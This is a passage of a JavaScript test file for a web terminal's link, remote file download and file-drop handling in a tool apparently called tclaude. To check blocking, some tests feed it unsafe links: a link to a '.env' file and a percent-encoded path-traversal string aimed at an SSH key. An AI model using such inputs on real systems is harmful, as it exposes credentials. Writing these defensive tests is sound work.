  harness.term.buffer = { active: { getLine: (row) => row === 0 ? line : null } };
  const linksAt = () => { let out; harness.linkProvider().provideLinks(1, (v) => { out = v; }); return out; };
  const settle = () => new Promise((r) => setImmediate(r));
  try {
    assert.deepEqual(linksAt(), [], 'no grant: visible paths stay plain text');
    viewer = 'env_v1';
    const [link] = linksAt();
    assert.equal(link.text, '/srv/proj/out/report.txt');
    link.hover({}, link.text);
    assert.equal(statuses.at(-1), 'Ctrl/Cmd-click download → /srv/proj/out/report.txt');
    link.activate({ ctrlKey: true }, link.text);
    await settle();
    const url = new URL(fetches[0][0], 'http://x');
    assert.equal(url.pathname, '/api/federation/terminal-file');
    assert.deepEqual(Object.fromEntries(url.searchParams), { terminal: terminalPath, viewer: 'env_v1', path: '/srv/proj/out/report.txt' });
    assert.equal(fetches[0][1].method, 'HEAD');
    assert.equal(anchors.length, 1); assert.ok(anchors[0].clicked); assert.equal(anchors[0].href, fetches[0][0]);

    // On a peer's own view every agent terminal is remote, and its files come
    // through /api/federation/, which that page keeps on this node.
    globalThis.__tclaudeRemoteNode = { id: 'inst_forge' };
    try {
      link.activate({ metaKey: true }, link.text);
      await settle();
      assert.equal(anchors.length, 2, 'a peer view downloads a remote terminal\'s file');
      assert.equal(new URL(fetches.at(-1)[0], 'http://x').pathname, '/api/federation/terminal-file');
    } finally {
      delete globalThis.__tclaudeRemoteNode;
    }
    fetches.length = 0; anchors.length = 1;

    // An OSC 8 link's label need not match its target: never a remote download.
    links.hover({}, 'file:///srv/proj/.env');
    assert.equal(statuses.at(-1), 'blocked unsafe link');

    // A refused HEAD has no body: a 403 is read once with an aborted GET.
    for (const code of ['not_shared', 'unsafe_path', 'root_too_broad', 'viewer_closed']) {
      fetches.length = 0;
      answer = async (u, init) => init.method === 'HEAD' ? { ok: false, status: 403 } : { ok: false, status: 403, json: async () => ({ code }) };
      link.activate({ ctrlKey: true }, link.text);
      await settle(); await settle();
      assert.equal(fetches.length, 2); assert.ok(fetches[1][1].signal, 'the error read is abortable');
      assert.equal(statuses.at(-1), REMOTE_FILE_ERRORS[code].slice(0, 120));
    }
    // Other statuses explain themselves and never re-read as a GET.
    for (const [status, code] of [[404, 'not_found'], [413, 'file_too_large'], [429, 'limit'], [503, 'peer_offline'], [504, 'timeout']]) {
      fetches.length = 0;
      answer = async () => ({ ok: false, status });
      link.activate({ ctrlKey: true }, link.text);
      await settle(); await settle();
      assert.equal(fetches.length, 1, `${status} is not re-read`);
      assert.equal(statuses.at(-1), REMOTE_FILE_ERRORS[code].slice(0, 120));
    }
    assert.equal(anchors.length, 1, 'a refused download clicks nothing');
    links.hover({}, '/srv/proj/%2e%2e/%2e%2e/home/u/.ssh/id');
    assert.equal(statuses.at(-1), 'blocked unsafe link', 'a remote path is never percent-decoded');
    viewer = '';
    assert.deepEqual(linksAt(), [], 'the view closed: links go');
  } finally {
    interactions.dispose();
  }
});

test('arbitrary files paste only into agent terminals, local or remote', () => {
  assert.equal(isAgentTerminalPath('/api/open-window-ws/agt_1'), true);
  assert.equal(isAgentTerminalPath('/api/spawn-focus-ws/label'), true);
  assert.equal(isAgentTerminalPath('/api/federation/terminal?peer=bob&agent=agt_1&mode=interactive'), true);
  assert.equal(isAgentTerminalPath('/api/federation/terminal?peer=bob&group=team&shell=group&mode=interactive'), false);
  assert.equal(isAgentTerminalPath('/api/federation/terminal?peer=bob&group=team&shell=start&agent=agt_1&mode=interactive'), false);
  assert.equal(isAgentTerminalPath('/api/term-ws/agt_1?which=current'), false);
  assert.equal(isAgentTerminalPath('/api/group-term-ws/team'), false);
});

test('pasted paths are quoted only when a name needs it', () => {
  assert.equal(terminalPathToken('/tmp/a/report-1.md'), '/tmp/a/report-1.md');
  assert.equal(terminalPathToken('/tmp/a/my file.md'), "'/tmp/a/my file.md'");
  assert.equal(terminalPathToken("/tmp/a/it's.md"), "'/tmp/a/it'\\''s.md'");
});

function fakeFile(name, type, size = 3) { return { name, type, size }; }
function fileItem(file, directory = false) {
  return { kind: 'file', getAsFile: () => file, webkitGetAsEntry: () => ({ isDirectory: directory }) };
}

test('a transfer keeps every file for agents, images only for shells, and skips folders', () => {
  const notes = fakeFile('notes.md', 'text/markdown');
  const shot = fakeFile('image.png', 'image/png');
  const gif = fakeFile('anim.gif', 'image/gif');
  const folder = fakeFile('src', '', 0);
  const dt = {
    items: [fileItem(notes), fileItem(shot), fileItem(gif), fileItem(folder, true)],
    files: [notes, shot, gif, folder],
  };
  assert.deepEqual(transferFiles(dt, true), { files: [notes, shot, gif], unsupported: false, folders: true });
  assert.deepEqual(transferFiles(dt, false), { files: [shot], unsupported: true, folders: true });
});

function dropEvent(dt) {
  const event = {
    dataTransfer: { types: ['Files'], dropEffect: 'none', ...dt },
    prevented: false,
    preventDefault() { this.prevented = true; },
    stopPropagation() {},
  };
  return event;
}

test('dropping files on an agent terminal uploads them and types their paths', async () => {
  const doc = new FakeEventTarget();
  const harness = terminalHarness(doc);
  const pasted = [];
  harness.term.paste = (text) => pasted.push(text);
  const requests = [];
  const interactions = attachTerminalInteractions({
    term: harness.term, host: harness.host,
    terminalPath: '/api/open-window-ws/agt_1',
    fetchImpl: async (url, init) => {
      requests.push({ url, names: init.body.getAll('file').map(f => f.name) });
      return { ok: true, json: async () => ({ files: [{ path: '/att/x/notes.md' }, { path: '/att/x/my shot.png' }] }) };
    },
  });
  try {
    const over = dropEvent({});
    harness.host.dispatch('dragover', over);
    assert.equal(over.prevented, true);
    assert.equal(over.dataTransfer.dropEffect, 'copy');
    const notes = new File(['# n'], 'notes.md', { type: 'text/markdown' });
    const shot = new File(['png'], 'my shot.png', { type: 'image/png' });
    const drop = dropEvent({ items: [fileItem(notes), fileItem(shot)], files: [notes, shot] });
    harness.host.dispatch('drop', drop);
    assert.equal(drop.prevented, true, 'the browser must not open the dropped file');
    await new Promise((resolve) => setTimeout(resolve, 0));
    assert.deepEqual(requests, [{
      url: `/api/terminal-attachments?terminal=${encodeURIComponent('/api/open-window-ws/agt_1')}`,
      names: ['notes.md', 'my shot.png'],
    }]);
    assert.deepEqual(pasted, ["/att/x/notes.md '/att/x/my shot.png' "]);
  } finally {
    interactions.dispose();
  }
});

test('a shell terminal refuses file drops without uploading', () => {
  const doc = new FakeEventTarget();
  const harness = terminalHarness(doc);
  let fetched = false;
  const interactions = attachTerminalInteractions({
    term: harness.term, host: harness.host,
    terminalPath: '/api/group-term-ws/team',
    fetchImpl: async () => { fetched = true; },
  });
  try {
    const over = dropEvent({});
    harness.host.dispatch('dragover', over);
    assert.equal(over.prevented, true, 'claimed so the browser cannot navigate to the file');
    assert.equal(over.dataTransfer.dropEffect, 'none');
    const notes = new File(['# n'], 'notes.md', { type: 'text/markdown' });
    harness.host.dispatch('drop', dropEvent({ items: [fileItem(notes)], files: [notes] }));
    assert.equal(fetched, false);
  } finally {
    interactions.dispose();
  }
});

test('a remote node without file paste gets a concise version hint', async () => {
  const doc = new FakeEventTarget();
  const harness = terminalHarness(doc);
  const statuses = [];
  const interactions = attachTerminalInteractions({
    term: harness.term, host: harness.host,
    setStatus: (s) => statuses.push(s),
    terminalPath: '/api/federation/terminal?peer=bob&agent=agt_1&mode=interactive',
    fetchImpl: async () => ({
      ok: false, status: 415,
      text: async () => JSON.stringify({ code: 'image', error: 'only PNG, JPEG and WebP images with matching MIME type are accepted' }),
    }),
  });
  try {
    const notes = new File(['# n'], 'notes.md', { type: 'text/markdown' });
    harness.host.dispatch('drop', dropEvent({ items: [fileItem(notes)], files: [notes] }));
    await new Promise((resolve) => setTimeout(resolve, 0));
    assert.equal(statuses.at(-1), 'file paste failed: remote node accepts images only (it may need a newer tclaude)');
  } finally {
    interactions.dispose();
  }
});
